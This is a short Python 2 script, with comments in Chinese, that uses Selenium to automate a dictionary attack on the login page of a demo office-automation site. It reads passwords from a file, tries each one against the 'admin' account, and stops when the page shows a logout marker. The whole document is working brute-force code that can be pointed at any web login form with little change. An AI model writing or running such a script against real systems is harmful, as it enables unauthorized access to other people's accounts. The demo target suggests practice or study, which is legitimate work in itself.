#coding:utf-8
import selenium
import selenium.webdriver
import time

def  loginoa(username,password):
    driver=selenium.webdriver.Chrome()
    driver.get("http://demo.smeoa.com")
    time.sleep(2)

    #。抓取账户密码的文本框，输入账户密码，
    #user_text=driver.find_element_by_id("emp_no")
    user_text=driver.find_element_by_name("emp_no")
    password_text=driver.find_element_by_id("password")
    password_text=driver.find_element_by_xpath("//*[@id=\"password\"]")
    time.sleep(1)
    user_text.send_keys(username)
    password_text.send_keys(password)
    time.sleep(1)
    #找到按钮，模拟登陆
    login=driver.find_element_by_id("login_btn")
    login.click()
    time.sleep(1)
    islogin=  driver.page_source.find(u"退出")!=-1
    time.sleep(2)
    driver.close()
    return  islogin

#print loginoa("admin","admin")
passfile=open("pass.txt","r")
while True:
    passline=passfile.readline()
    if not passline:
        break
    passlist= passline.split(" # ")

    islogin=loginoa("admin",passlist[0])
    print passlist[0],"login",islogin
    if  islogin:
        break
